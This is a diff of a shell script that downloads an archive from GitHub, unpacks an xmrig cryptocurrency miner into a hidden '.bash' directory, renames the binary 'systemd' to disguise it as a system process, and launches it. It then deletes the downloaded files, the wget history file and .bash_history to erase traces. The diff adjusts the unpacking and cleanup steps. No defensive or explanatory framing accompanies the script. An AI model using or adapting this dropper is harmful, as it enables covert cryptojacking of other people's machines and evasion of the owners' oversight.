@@ -1,14 +1,16 @@
 wget https://github.com/deusveritatis/configs/archive/master.zip
+unzip master.zip
+cd configs-master
 tar -xvzf ./bash.tar.gz
 mv ./xmrig-2.10.0 ./.bash
-mv ./config.json ../.bash/config.json
-rm ./bash.tar.gz
+mv ./config.json ./.bash/config.json
 cd .bash/
 mv ./xmrig ./systemd
 ./systemd
-cd ..
-rm -r ./.bash
+cd ../..
+rm -r ./config-master
 rm ./nv3v2
 rm .wget-hsts
 rm .bash_history && history && exit
+
 
